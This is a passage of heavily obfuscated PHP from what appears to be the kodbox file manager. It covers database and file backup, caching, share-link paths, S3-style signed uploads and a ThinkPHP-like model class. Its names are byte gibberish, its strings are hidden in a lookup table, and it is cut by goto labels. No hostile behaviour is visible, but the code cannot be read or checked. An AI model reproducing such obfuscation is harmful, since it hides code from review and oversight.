$_SERVER[ñˆ‹ß¿÷]; $šÊ…¾¢Ö = array($¯È—‡ä—[1655] => USER_ID, $¯È—‡ä—[484] => 0); $¦§ƒñ…« = $this->where($šÊ…¾¢Ö)->max($¯È—‡ä—[1860]); $Ùì‰‡ï = array($¯È—‡ä—[1860] => $¦§ƒñ…« + 1); return $this->where($šÊ…¾¢Ö)->where(array($¯È—‡ä—[32] => $«¾›Êìí))->save($Ùì‰‡ï); } private function getAutoName($ûèÌí¨Å) { $Ñöƒğú™ =& $_SERVER[ñˆ‹ß¿÷]; $ú¸Ä¬õ = array($Ñöƒğú™[1655] => USER_ID, $Ñöƒğú™[484] => 0); $€Ã“õ¥ = $this->field($Ñöƒğú™[32])->where($ú¸Ä¬õ)->select(); $€Ã“õ¥ = array_to_keyvalue($€Ã“õ¥, $Ñöƒğú™[12], $Ñöƒğú™[32]); if (!$€Ã“õ¥ || !in_array($ûèÌí¨Å, $€Ã“õ¥)) { return $ûèÌí¨Å; } for ($´ÙÌñ = 0; $´ÙÌñ < count($€Ã“õ¥); $´ÙÌñ++) { if (!in_array($ûèÌí¨Å . "\50{$´ÙÌñ}\x29", $€Ã“õ¥)) { return $ûèÌí¨Å . "\x28{$´ÙÌñ}\x29"; } } return $ûèÌí¨Å . "\x28{$´ÙÌñ}\51"; } } goto bî‚ê¡ÎÕé; FÚŞ«©Å×: class BackupDbFile { public function __construct() { } public function index() { $‡Ş©È›Ç =& $_SERVER[ñˆ‹ß¿÷]; $ÚŞÉª†‡ = Backup::get(); $°ë›ŠÑµ = $ÚŞÉª†‡[$‡Ş©È›Ç[32]]; $âŠÏÎí‰ = $this->tmpFilesPath() . "\x62\x61\x63\x6b\x75\x70\x5f{$°ë›ŠÑµ}\57"; $İ¹–ÏÜ = $this->backupPath($ÚŞÉª†‡); if (!($İ¹–ÏÜ = IO::mkdir($İ¹–ÏÜ))) { return !1; } $ãŠÃğ¸ = IO::listPath($âŠÏÎí‰); $…º¾µË = isset($ãŠÃğ¸[$‡Ş©È›Ç[83]]) ? $ãŠÃğ¸[$‡Ş©È›Ç[83]] : array(); $şí¨úøå = array_sum(array_column($…º¾µË, $‡Ş©È›Ç[76])); if (!$şí¨úøå) { return !1; } $†ÍÌõš‡ = array($‡Ş©È›Ç[805] => $şí¨úøå, $‡Ş©È›Ç[806] => time()); Backup::set($†ÍÌõš‡); $¹¬×Èä“ = new TaskFileTransfer($‡Ş©È›Ç[807], $‡Ş©È›Ç[787], count($…º¾µË), LNG($‡Ş©È›Ç[788]) . $‡Ş©È›Ç[386] . LNG($‡Ş©È›Ç[790]) . $‡Ş©È›Ç[808]); $¹¬×Èä“->task[$‡Ş©È›Ç[770]] = $şí¨úøå; foreach ($ãŠÃğ¸[$‡Ş©È›Ç[83]] as $¢òÍ¨) { $ùÒßÌ· = IO::move($¢òÍ¨[$‡Ş©È›Ç[84]], $İ¹–ÏÜ); if (!$ùÒßÌ·) { $¹¬×Èä“->end(); $ÌòÓ×³ = IO::getLastError($‡Ş©È›Ç[809] . $¢òÍ¨[$‡Ş©È›Ç[84]] . $‡Ş©È›Ç[810] . $İ¹–ÏÜ . $‡Ş©È›Ç[164]); write_log($ÌòÓ×³, $‡Ş©È›Ç[787]); return !1; } } $ŠëÌç = new DbManage(); $‹Á²ôÎ“ = $ŠëÌç->getSqlFile(); if (!$‹Á²ôÎ“[$‡Ş©È›Ç[811]] || !$‹Á²ôÎ“[$‡Ş©È›Ç[13]]) { return !1; } IO::move($‹Á²ôÎ“[$‡Ş©È›Ç[811]], $İ¹–ÏÜ); IO::move($‹Á²ôÎ“[$‡Ş©È›Ç[13]], $İ¹–ÏÜ); $¹¬×Èä“->end(); $†ÍÌõš‡ = array($‡Ş©È›Ç[812] => $şí¨úøå, $‡Ş©È›Ç[813] => time()); Backup::set($†ÍÌõš‡); return !0; } private function backupPath($çç¾Ÿå›) { $£„“¶ğ =& $_SERVER[ñˆ‹ß¿÷]; $ë«ş§Öç = $çç¾Ÿå›[$£„“¶ğ[32]]; $ÍË¡¡ßÌ = Model($£„“¶ğ[777])->get($£„“¶ğ[778]); $Íú§£ò¥ = substr(md5($£„“¶ğ[779] . $ÍË¡¡ßÌ . $ë«ş§Öç), 0, 8); return "\173\x69\x6f\72{$çç¾Ÿå›[$£„“¶ğ[759]]}\x7d\x2f\x64\141\x74\141\x62\141\163\145\x2f\x62\x61\143\x6b\x75\160\x2f" . $ë«ş§Öç . $£„“¶ğ[11] . $Íú§£ò¥; } private function tmpFilesPath() { $øÚŞÖê =& $_SERVER[ñˆ‹ß¿÷]; $£Â˜·º = TEMP_FILES; if ($GLOBALS[$øÚŞÖê[6]][$øÚŞÖê[89]][$øÚŞÖê[803]]) { $£Â˜·º = $GLOBALS[$øÚŞÖê[6]][$øÚŞÖê[89]][$øÚŞÖê[803]]; if (!mk_dir($£Â˜·º) || !is_writable($£Â˜·º) || !IO::mkfile($£Â˜·º . $øÚŞÖê[804])) { $£Â˜·º = TEMP_FILES; } } return $£Â˜·º; } } class BackupFile { public function __construct() { } public function index() { $Ó’Õ÷½Ÿ = Backup::get(); $«ª¬Ÿµ = $Ó’Õ÷½Ÿ[$_SERVER[ñˆ‹ß¿÷][293]][$_SERVER[ñˆ‹ß¿÷][199]][$_SERVER[ñˆ‹ß¿÷][468]]; $Òéü¥› = array($_SERVER[ñˆ‹ß¿÷][469] => array($_SERVER[ñˆ‹ß¿÷][814], $«ª¬Ÿµ), $_SERVER[ñˆ‹ß¿÷][815] => array($_SERVER[ñˆ‹ß¿÷][331], $Ó’Õ÷½Ÿ[$_SERVER[ñˆ‹ß¿÷][759]])); $ä‰âœÑ = (int) Model($_SERVER[ñˆ‹ß¿÷][796])->where($Òéü¥›)->count($_SERVER[ñˆ‹ß¿÷][468]); $‘Õ½Éöø = (int) Model($_SERVER[ñˆ‹ß¿÷][796])->where($Òéü¥›)->sum($_SERVER[ñˆ‹ß¿÷][76]); $»¡ª‚Ú = new TaskFileTransfer($_SERVER[ñˆ‹ß¿÷][816], $_SERVER[ñˆ‹ß¿÷][787], $ä‰âœÑ, LNG($_SERVER[ñˆ‹ß¿÷][788]) . $_SERVER[ñˆ‹ß¿÷][789] . LNG($_SERVER[ñˆ‹ß¿÷][817])); $»¡ª‚Ú->task[$_SERVER[ñˆ‹ß¿÷][770]] = $‘Õ½Éöø; $ğıó¦œí = array($_SERVER[ñˆ‹ß¿÷][818] => $ä‰âœÑ, $_SERVER[ñˆ‹ß¿÷][819] => $‘Õ½Éöø, $_SERVER[ñˆ‹ß¿÷][820] => time()); Backup::set($ğıó¦œí); $´â©è¿Ò = !0; $„­ÁÃ§„ = $this->storeIds(); $ş•’Ê°Ü = 1; $«Ï´Í‘ = 1000; $íşÜæäà = $èêÌñŠ¦ = 0; $Í÷”¡äÖ = array(); $¬ÌîùÛ’ = $“ººœ = 0; do { $Ì…ÊŒØ÷ = $_SERVER[ñˆ‹ß¿÷][821]; $™ÕÄüÍŠ = Model($_SERVER[ñˆ‹ß¿÷][796])->where($Òéü¥›)->field($Ì…ÊŒØ÷)->order($_SERVER[ñˆ‹ß¿÷][822])->selectPage($«Ï´Í‘, $ş•’Ê°Ü); $—Û€Ö¦é = !empty($™ÕÄüÍŠ[$_SERVER[ñˆ‹ß¿÷][369]]) ? $™ÕÄüÍŠ[$_SERVER[ñˆ‹ß¿÷][369]] : array(); foreach ($—Û€Ö¦é as $’Öú®¦¯) { if (!$this->_fileExist($’Öú®¦¯, $Í÷”¡äÖ, $„­ÁÃ§„)) { $ä‰âœÑ -= 1; $‘Õ½Éöø -= (int) $’Öú®¦¯[$_SERVER[ñˆ‹ß¿÷][76]]; write_log("\146\151\x6c\145\x20\x6e\157\164\x20\145\x78\x69\163\164\x2e\146\151\154\145\x49\x44\72{$’Öú®¦¯[$_SERVER[ñˆ‹ß¿÷][468]]}\54\40\160\x61\x74\x68\72{$’Öú®¦¯[$_SERVER[ñˆ‹ß¿÷][84]]}", $_SERVER[ñˆ‹ß¿÷][823]); continue; } $Ğğµ¢§¢ = $’Öú®¦¯[$_SERVER[ñˆ‹ß¿÷][84]]; $Áãí¬â• = "\x7b\151\157\x3a{$Ó’Õ÷½Ÿ[$_SERVER[ñˆ‹ß¿÷][759]]}\175" . substr($Ğğµ¢§¢, strlen("\173\151\157\x3a{$’Öú®¦¯[$_SERVER[ñˆ‹ß¿÷][824]]}\175")); if (IO::exist($Áãí¬â•)) { $»¡ª‚Ú->updateFileEnd($’Öú®¦¯[$_SERVER[ñˆ‹ß¿÷][32]], $’Öú®¦¯[$_SERVER[ñˆ‹ß¿÷][76]]); } else { $Áãí¬â• = get_path_father($Áãí¬â•); IO::mkdir($Áãí¬â•); if (!IO::copy($Ğğµ¢§¢, $Áãí¬â•, $_SERVER[ñˆ‹ß¿÷][825])) { write_log($_SERVER[ñˆ‹ß¿÷][826] . $Ğğµ¢§¢ . $_SERVER[ñˆ‹ß¿÷][810] . $Áãí¬â• . $_SERVER[ñˆ‹ß¿÷][164], $_SERVER[ñˆ‹ß¿÷][787]); $´â©è¿Ò = !1; break; } } $«ª¬Ÿµ = $’Öú®¦¯[$_SERVER[ñˆ‹ß¿÷][468]]; $èêÌñŠ¦ += 1; $íşÜæäà += $’Öú®¦¯[$_SERVER[ñˆ‹ß¿÷][76]]; $“ººœ += 1; $¬ÌîùÛ’ += $’Öú®¦¯[$_SERVER[ñˆ‹ß¿÷][76]]; if ($íşÜæäà >= 1024 * 1024 * 100) { $ğıó¦œí = array($_SERVER[ñˆ‹ß¿÷][827] => $«ª¬Ÿµ, $_SERVER[ñˆ‹ß¿÷][828] => $“ººœ, $_SERVER[ñˆ‹ß¿÷][829] => $¬ÌîùÛ’); Backup::set($ğıó¦œí); $íşÜæäà = $èêÌñŠ¦ = 0; } } $Æ™Üâã = count($—Û€Ö¦é); $ş•’Ê°Ü++; } while ($Æ™Üâã == $«Ï´Í‘); $»¡ª‚Ú->end(); $ğıó¦œí = array($_SERVER[ñˆ‹ß¿÷][830] => 1, $_SERVER[ñˆ‹ß¿÷][497] => time(), $_SERVER[ñˆ‹ß¿÷][782] => 1, $_SERVER[ñˆ‹ß¿÷][827] => $«ª¬Ÿµ, $_SERVER[ñˆ‹ß¿÷][819] => $‘Õ½Éöø, $_SERVER[ñˆ‹ß¿÷][818] => $ä‰âœÑ, $_SERVER[ñˆ‹ß¿÷][831] => time()); if ($èêÌñŠ¦) { $ğıó¦œí[$_SERVER[ñˆ‹ß¿÷][828]] = $“ººœ; $ğıó¦œí[$_SERVER[ñˆ‹ß¿÷][829]] = $¬ÌîùÛ’; } Backup::set($ğıó¦œí); $this->_fileFilter($Í÷”¡äÖ); return !0; } private function _fileExist($Ô¹…ÉÓõ, &$»Ê¦°Ö¡, $¥¾—ƒ‹º) { $°ÚîÕõ =& $_SERVER[ñˆ‹ß¿÷]; $…—¯ò„ = $Ô¹…ÉÓõ[$°ÚîÕõ[84]]; if (in_array($Ô¹…ÉÓõ[$°ÚîÕõ[468]], $»Ê¦°Ö¡)) { return !1; } if (!in_array($Ô¹…ÉÓõ[$°ÚîÕõ[824]], $¥¾—ƒ‹º)) { return !1; } if (IO::exist($…—¯ò„)) { return !0; } $øôÓó£› = get_path_father($…—¯ò„); if (IO::exist($øôÓó£›)) { $»Ê¦°Ö¡[] = $Ô¹…ÉÓõ[$°ÚîÕõ[468]]; return !1; } $öİÓ„à¥ = array($°ÚîÕõ[824] => $Ô¹…ÉÓõ[$°ÚîÕõ[824]], $°ÚîÕõ[84] => array($°ÚîÕõ[383], "{$øôÓó£›}\45")); $œªŒ£ÎÈ = Model($°ÚîÕõ[796])->where($öİÓ„à¥)->field($°ÚîÕõ[469])->select(); $»Ê¦°Ö¡ = array_merge($»Ê¦°Ö¡, array_to_keyvalue($œªŒ£ÎÈ, $°ÚîÕõ[12], $°ÚîÕõ[468])); return !1; } private function _fileFilter($‘Ëó˜Î¾) { $˜ûÜÏµĞ =& $_SERVER[ñˆ‹ß¿÷]; if (empty($‘Ëó˜Î¾)) { return; } $÷¡‘Íİ¾ = array($˜ûÜÏµĞ[468] => array($˜ûÜÏµĞ[7], array_unique($‘Ëó˜Î¾))); $îŒÆ³Õ = Model($˜ûÜÏµĞ[832])->where($÷¡‘Íİ¾)->field($˜ûÜÏµĞ[402])->select(); foreach ($îŒÆ³Õ as $¬­Ê²üµ) { Model($˜ûÜÏµĞ[832])->remove($¬­Ê²üµ[$˜ûÜÏµĞ[402]], !1); } } private function storeIds() { $êµıŒÔ¯ =& $_SERVER[ñˆ‹ß¿÷]; $„®æßÄù = Model($êµıŒÔ¯[774])->listData(); $ Êµº… = array(); $¤˜•ù¦ı = $GLOBALS[$êµıŒÔ¯[6]][$êµıŒÔ¯[89]][$êµıŒÔ¯[833]]; foreach ($„®æßÄù as $ÈİóÂÇˆ) { $íğÆ‡ˆ® = strtolower($ÈİóÂÇˆ[$êµıŒÔ¯[95]]); if (!isset($¤˜•ù¦ı[$íğÆ‡ˆ®])) { continue; } $«õıÕ°¤ = $êµıŒÔ¯[74] . (isset($¤˜•ù¦ı[$íğÆ‡ˆ®]) ? $¤˜•ù¦ı[$íğÆ‡ˆ®] : ucfirst($íğÆ‡ˆ®)); if (!class_exists($«õıÕ°¤)) { continue; } $ Êµº…[] = $ÈİóÂÇˆ[$êµıŒÔ¯[399]]; } return $ Êµº…; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $€Ã¾¨Ü˜ =& $_SERVER[ñˆ‹ß¿÷]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $Ê¡˜°ê = $GLOBALS[$€Ã¾¨Ü˜[6]][$€Ã¾¨Ü˜[349]]; $éÛÙÊÊÚ = $Ê¡˜°ê[$Ê¡˜°ê[$€Ã¾¨Ü˜[834]]]; $îÄãû = $Ê¡˜°ê[$€Ã¾¨Ü˜[835]]; switch ($Ê¡˜°ê[$€Ã¾¨Ü˜[834]]) { case $€Ã¾¨Ü˜[21]: self::$handle = Model($€Ã¾¨Ü˜[836]); break; case $€Ã¾¨Ü˜[837]: self::$handle = new CacheRedis($éÛÙÊÊÚ, $îÄãû); break; case $€Ã¾¨Ü˜[838]: self::$handle = new CacheMemcached($éÛÙÊÊÚ, $îÄãû); break; case $€Ã¾¨Ü˜[199]: self::$handle = new CacheFile($éÛÙÊÊÚ, $îÄãû); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($°ƒİÔÇ·) { if (is_array($°ƒİÔÇ·) || is_object($°ƒİÔÇ·)) { $°ƒİÔÇ· = json_encode($°ƒİÔÇ·); } $°ƒİÔÇ· = rawurlencode($°ƒİÔÇ·); return md5(KOD_SITE_ID . $_SERVER[ñˆ‹ß¿÷][11] . $°ƒİÔÇ·); } public static function get($Ù®‡íÉ, $ÏÖÚ×Ñ = false) { $¬âÅØı° = self::key($Ù®‡íÉ); if ($ÏÖÚ×Ñ) { return unserialize(self::init()->get($¬âÅØı°)); } if (!isset(self::$memoryCache[$¬âÅØı°])) { $¾¥õ“Ãæ = self::init()->get($¬âÅØı°); self::$memoryCache[$¬âÅØı°] = unserialize($¾¥õ“Ãæ); } return self::$memoryCache[$¬âÅØı°]; } public static function set($¸š¢¸‚¼, $—´ãïî, $ø¢ß”¯İ = false) { $°Ï¤±¿ = self::key($¸š¢¸‚¼); if (isset(self::$memoryCache[$°Ï¤±¿]) && self::$memoryCache[$°Ï¤±¿] === $—´ãïî) { return !0; } if ($ø¢ß”¯İ === 0) { self::$memoryCache[$°Ï¤±¿] = $—´ãïî; return !0; } CacheLock::lock($¸š¢¸‚¼); $¿–àÄ†ö = self::init()->set($°Ï¤±¿, serialize($—´ãïî), $ø¢ß”¯İ); self::$memoryCache[$°Ï¤±¿] = $—´ãïî; CacheLock::unlock($¸š¢¸‚¼); return $¿–àÄ†ö; } public static function getCall($ÍğıÔ™, $ÎÂ¯ºÓ¨, $ı°·ìóŠ, $ËÀÜ®¶È = array()) { $‘ñÊıÆ˜ =& $_SERVER[ñˆ‹ß¿÷]; $¦øª¯Ş’ = self::get($ÍğıÔ™); if ($¦øª¯Ş’ || $¦øª¯Ş’ === $‘ñÊıÆ˜[12]) { return $¦øª¯Ş’; } $¦øª¯Ş’ = call_user_func_array($ı°·ìóŠ, $ËÀÜ®¶È); $¦øª¯Ş’ = $¦øª¯Ş’ ? $¦øª¯Ş’ : $‘ñÊıÆ˜[12]; self::set($ÍğıÔ™, $¦øª¯Ş’, $ÎÂ¯ºÓ¨); return $¦øª¯Ş’; } public static function remove($˜ƒËóğş) { $àä…’òÉ = self::key($˜ƒËóğş); unset(self::$memoryCache[$àä…’òÉ]); self::clearTimeout(); CacheLock::lock($˜ƒËóğş); $¨Â À” = self::init()->remove($àä…’òÉ); CacheLock::unlock($˜ƒËóğş); return $¨Â À”; } public static function removeMemory($¸—¡”³) { $Òª…ÜÚ = self::key($¸—¡”³); unset(self::$memoryCache[$Òª…ÜÚ]); } public static function clearMemory($î‹åì» = false) { if ($î‹åì») { $î‹åì» = self::key($î‹åì»); unset(self::$memoryCache[$î‹åì»]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ñˆ‹ß¿÷][839])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ñˆ‹ß¿÷][840])) { self::init()->clearTimeout(); } } } goto c‹ÈÑÇõ¹; f…ò½İéÏÏ: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($­›ü¥¼ø) { $this->pathParse = $­›ü¥¼ø; } protected function infoParse($Ú€ëÜÒË, $è½©¹Äû = false) { $ı¸ÄÎ‘™ =& $_SERVER[ñˆ‹ß¿÷]; return Action($ı¸ÄÎ‘™[1182])->sharePathInfo($this->pathParse[$ı¸ÄÎ‘™[84]], !0, $è½©¹Äû); } public function listPath($éûŒ«•š, $õš‰ì = false) { $ìªõª‡ò =& $_SERVER[ñˆ‹ß¿÷]; $ª°î”Æâ = IO::listPath($éûŒ«•š, $õš‰ì); if (!$ª°î”Æâ) { return $ª°î”Æâ; } if (is_array($ª°î”Æâ[$ìªõª‡ò[1343]])) { $îÑĞ¸ø¹ = Action($ìªõª‡ò[1354])->parsePathChildren($ª°î”Æâ[$ìªõª‡ò[1343]], array($ìªõª‡ò[421] => $éûŒ«•š)); $ª°î”Æâ[$ìªõª‡ò[1343]] = Action($ìªõª‡ò[1182])->shareItemInfo($îÑĞ¸ø¹); } foreach ($ª°î”Æâ as $±ºÃÒ™  => $Í¡ë¬°Æ) { if (!in_array($±ºÃÒ™ , array($ìªõª‡ò[83], $ìªõª‡ò[82]))) { continue; } foreach ($Í¡ë¬°Æ as $èÇÑ—ÉÏ => $îÑĞ¸ø¹) { $îÑĞ¸ø¹ = Action($ìªõª‡ò[1354])->parsePathChildren($îÑĞ¸ø¹, array($ìªõª‡ò[421] => $éûŒ«•š)); $ª°î”Æâ[$±ºÃÒ™ ][$èÇÑ—ÉÏ] = Action($ìªõª‡ò[1182])->shareItemInfo($îÑĞ¸ø¹); } } return $ª°î”Æâ; } public function listAll($›´”œë§) { $¾ÀŸ¬‰‘ =& $_SERVER[ñˆ‹ß¿÷]; $Åò–›–† = IO::listAll($›´”œë§); foreach ($Åò–›–† as &$üÉ›Û”’) { $õÌŒ±¡´ = IO::info($üÉ›Û”’[$¾ÀŸ¬‰‘[84]]); $õÌŒ±¡´ = is_array($õÌŒ±¡´) ? $õÌŒ±¡´ : array(); $üÉ›Û”’ = array_merge($õÌŒ±¡´, $üÉ›Û”’); $üÉ›Û”’[$¾ÀŸ¬‰‘[86]] = Action($¾ÀŸ¬‰‘[1182])->shareItemInfo($üÉ›Û”’); } unset($üÉ›Û”’); return $Åò–›–†; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($™ÛÓ‰â¥) { parent::__construct($™ÛÓ‰â¥); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ëÄ¹»ÇÒ) { parent::__construct($ëÄ¹»ÇÒ); $this->signatureVersion($_SERVER[ñˆ‹ß¿÷][216]); } public function uploadFormData($„¤ÚÀğ, $ƒ´…÷şé = 3600) { $‡šÌÁøš =& $_SERVER[ñˆ‹ß¿÷]; $äçÕÇ–Ÿ = $‡šÌÁøš[198]; $ô÷ÕÇÌ = $‡šÌÁøš[1355]; $Ñô–äô• = $‡šÌÁøš[62]; $ºşõ¢ê¹ = gmdate($‡šÌÁøš[1356]); $Ü—ÇÍ¿ = gmdate($‡šÌÁøš[758]); $Ñú¶Ï÷İ = $‡šÌÁøš[1357]; $üÊô· = $ƒ´…÷şé . $‡šÌÁøš[12]; $şÖÜí„ƒ = $‡šÌÁøš[1317]; $±ŸßÑîÁ = array($this->accessKey, $Ü—ÇÍ¿, $this->region, $Ñô–äô•, $Ñú¶Ï÷İ); $°Åµ¿Š¸ = implode($‡šÌÁøš[8], $±ŸßÑîÁ); $óàËºˆ = array($‡šÌÁøš[1319] => gmdate($‡šÌÁøš[1318], strtotime($‡šÌÁøš[1358])), $‡šÌÁøš[1320] => array(array($‡šÌÁøš[1322] => $this->bucket), array($‡šÌÁøš[1321] => $äçÕÇ–Ÿ), array($‡šÌÁøš[1323], $‡šÌÁøš[1324], $‡šÌÁøš[12]), array($‡šÌÁøš[1323], $‡šÌÁøš[1359], $‡šÌÁøš[12]), array($‡šÌÁøš[1323], $‡šÌÁøš[1360], $‡šÌÁøš[12]), array($‡šÌÁøš[1325] => $şÖÜí„ƒ), array($‡šÌÁøš[1361] => $°Åµ¿Š¸), array($‡šÌÁøš[1362] => $ô÷ÕÇÌ), array($‡šÌÁøš[1363] => $ºşõ¢ê¹), array($‡šÌÁøš[1364] => $üÊô·))); $Ù¨»”Ú› = base64_encode(json_encode($óàËºˆ)); $˜ñ†ÂÎã = hash_hmac($‡šÌÁøš[1365], $Ü—ÇÍ¿, $‡šÌÁøš[1366] . $this->secret, !0); $•¥ïù£ = hash_hmac($‡šÌÁøš[1365], $this->region, $˜ñ†ÂÎã, !0); $Ü„´à½Ê = hash_hmac($‡šÌÁøš[1365], $Ñô–äô•, $•¥ïù£, !0); $à“ µÜÓ = hash_hmac($‡šÌÁøš[1365], $Ñú¶Ï÷İ, $Ü„´à½Ê, !0); $›È¿œÒã = hash_hmac($‡šÌÁøš[1365], $Ù¨»”Ú›, $à“ µÜÓ); $“ÄÉÛœ = array($‡šÌÁøš[215] => $‡šÌÁøš[12], $‡šÌÁøš[1367] => $‡šÌÁøš[12], $‡šÌÁøš[1321] => $äçÕÇ–Ÿ, $‡šÌÁøš[1325] => $şÖÜí„ƒ, $‡šÌÁøš[1329] => $Ù¨»”Ú›, $‡šÌÁøš[1368] => $°Åµ¿Š¸, $‡šÌÁøš[1369] => $ô÷ÕÇÌ, $‡šÌÁøš[1370] => $ºşõ¢ê¹, $‡šÌÁøš[1371] => $üÊô·, $‡šÌÁøš[1372] => $›È¿œÒã, $‡šÌÁøš[181] => $this->getHost()); return $“ÄÉÛœ; } } goto E„ëæ‚öÚ±; B£ÀÇ¥ÊŒ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\142\154\x65", "\157\x72\144\x65\162", "\x61\154\x69\x61\x73", "\150\x61\166\151\156\147", "\x67\162\x6f\x75\160", "\154\x6f\143\153", "\144\x69\163\x74\151\156\x63\164", "\x61\165\x74\157", "\146\151\154\x74\x65\162", "\166\141\x6c\x69\144\141\164\145", "\162\x65\x73\165\154\164", "\x62\151\156\x64", "\x74\x6f\153\145\x6e"); public function __construct($¢ ø¶­ò = '', $ªÊÀ¶¹ = '', $Ï“¯À–å = '') { $ñ»š”²ª =& $_SERVER[ñˆ‹ß¿÷]; $this->_initialize(); if (!empty($¢ ø¶­ò)) { if (strpos($¢ ø¶­ò, $ñ»š”²ª[10])) { list($this->dbName, $this->name) = explode($ñ»š”²ª[10], $¢ ø¶­ò); } else { $this->name = $¢ ø¶­ò; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ªÊÀ¶¹)) { $this->tablePrefix = $ñ»š”²ª[12]; } elseif ($ñ»š”²ª[12] != $ªÊÀ¶¹) { $this->tablePrefix = $ªÊÀ¶¹; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ñ»š”²ª[244]); } $this->db(0, empty($this->connection) ? $Ï“¯À–å : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Îä–¥æ™ =& $_SERVER[ñˆ‹ß¿÷]; if (empty($this->fields)) { if (think_config($Îä–¥æ™[245])) { $·Èšõï = $this->dbName ? $this->dbName : think_config($Îä–¥æ™[246]); $ˆ¶·ı° = think_var_cache($Îä–¥æ™[247] . strtolower(get_path_this($·Èšõï) . $Îä–¥æ™[10] . $this->name)); if ($ˆ¶·ı°) { $èĞ˜Ù¿à = think_config($Îä–¥æ™[248]); if (empty($èĞ˜Ù¿à) || $ˆ¶·ı°[$Îä–¥æ™[249]] == $èĞ˜Ù¿à) { $this->fields = $ˆ¶·ı°; return; } } } $this->flush(); } } public function flush() { $ÓÅğ·àù =& $_SERVER[ñˆ‹ß¿÷]; $this->db->setModel($this->name); $Ö÷¹§å¤ = $this->db->getFields($this->getTableName()); if (!$Ö÷¹§å¤) { return !1; } $this->fields = array_keys($Ö÷¹§å¤); $this->fields[$ÓÅğ·àù[250]] = !1; foreach ($Ö÷¹§å¤ as $´¼âÆŒè => $Íï¢äáõ) { $²œ‚¹éó[$´¼âÆŒè] = $Íï¢äáõ[$ÓÅğ·àù[33]]; if ($Íï¢äáõ[$ÓÅğ·àù[39]]) { $this->fields[$ÓÅğ·àù[251]] = $´¼âÆŒè; if ($Íï¢äáõ[$ÓÅğ·àù[42]]) { $this->fields[$ÓÅğ·àù[250]] = !0; } } } $this->fields[$ÓÅğ·àù[252]] = $²œ‚¹éó; if (think_config($ÓÅğ·àù[248])) { $this->fields[$ÓÅğ·àù[249]] = think_config($ÓÅğ·àù[248]); } if (think_config($ÓÅğ·àù[245])) { $ã–ı›ôß = $this->dbName ? $this->dbName : think_config($ÓÅğ·àù[246]); think_var_cache($ÓÅğ·àù[247] . strtolower(get_path_this($ã–ı›ôß) . $ÓÅğ·àù[10] . $this->name), $this->fields); } } public function switchModel($¯­øÓ–´, $ÏŠÙ„Ÿª = array()) { $ğ»ó–¥€ =& $_SERVER[ñˆ‹ß¿÷]; $ô¥ Ø›É = ucwords(strtolower($¯­øÓ–´)) . $ğ»ó–¥€[253]; if (!class_exists($ô¥ Ø›É)) { think_exception($ô¥ Ø›É . think_lang($ğ»ó–¥€[254])); } $this->_extModel = new $ô¥ Ø›É($this->name); if (!empty($ÏŠÙ„Ÿª)) { foreach ($ÏŠÙ„Ÿª as $¿ë¿¿–ü) { $this->_extModel->setProperty($¿ë¿¿–ü, $this->{$¿ë¿¿–ü}); } } return $this->_extModel; } public function __set($ÑıÒµöğ, $ˆ¶Ö¢¢ê) { $this->data[$ÑıÒµöğ] = $ˆ¶Ö¢¢ê; } public function __get($„Óö¨Ìò) { return isset($this->data[$„Óö¨Ìò]) ? $this->data[$„Óö¨Ìò] : null; } public function __isset($şÈó˜…Ì) { return isset($this->data[$şÈó˜…Ì]); } public function __unset($îóôö‘ˆ) { unset($this->data[$îóôö‘ˆ]); } public function __call($ºµ®ÅØÆ, $èî¥’È¬) { $ğŠ—Û±û =& $_SERVER[ñˆ‹ß¿÷]; if (in_array(strtolower($ºµ®ÅØÆ), $this->methods, !0)) { $this->options[strtolower($ºµ®ÅØÆ)] = $èî¥’È¬[0]; return $this; } elseif (in_array(strtolower($ºµ®ÅØÆ), array($ğŠ—Û±û[255], $ğŠ—Û±û[256], $ğŠ—Û±û[257], $ğŠ—Û±û[258], $ğŠ—Û±û[259]), !0)) { $‡¿¹æ÷  = isset($èî¥’È¬[0]) ? $èî¥’È¬[0] : $ğŠ—Û±û[188]; $‡¿¹æ÷  = $this->db->parseKey($‡¿¹æ÷ ); return $this->getField(strtoupper($ºµ®ÅØÆ) . $ğŠ—Û±û[260] . $‡¿¹æ÷  . $ğŠ—Û±û[261] . $ºµ®ÅØÆ, $ğŠ—Û±û[255]); } elseif (strtolower(substr($ºµ®ÅØÆ, 0, 5)) == $ğŠ—Û±û[262]) { $‡¿¹æ÷  = think_parse_name(substr($ºµ®ÅØÆ, 5)); $èªÇ´[$‡¿¹æ÷ ] = $èî¥’È¬[0]; return $this->where($èªÇ´)->find(); } elseif (strtolower(substr($ºµ®ÅØÆ, 0, 10)) == $ğŠ—Û±û[263]) { $ÁğÚ­·… = think_parse_name(substr($ºµ®ÅØÆ, 10)); $èªÇ´[$ÁğÚ­·…] = $èî¥’È¬[0]; return $this->where($èªÇ´)->getField($èî¥’È¬[1]); } elseif (isset($this->_scope[$ºµ®ÅØÆ])) { return $this->scope($ºµ®ÅØÆ, $èî¥’È¬[0]); } elseif (method_exists($this, $ºµ®ÅØÆ)) { array_unshift($èî¥’È¬, $ºµ®ÅØÆ); return call_user_func_array(array($this, $ğŠ—Û±û[264]), $èî¥’È¬); } else { return call_user_func_array(array(parent, $ºµ®ÅØÆ), $èî¥’È¬); } } protected function call() { $€àË•š¹ =& $_SERVER[ñˆ‹ß¿÷]; $õâÂõƒë = func_get_args(); $²ÌˆºÓï = array_shift($õâÂõƒë); $äí‡ô‹ = 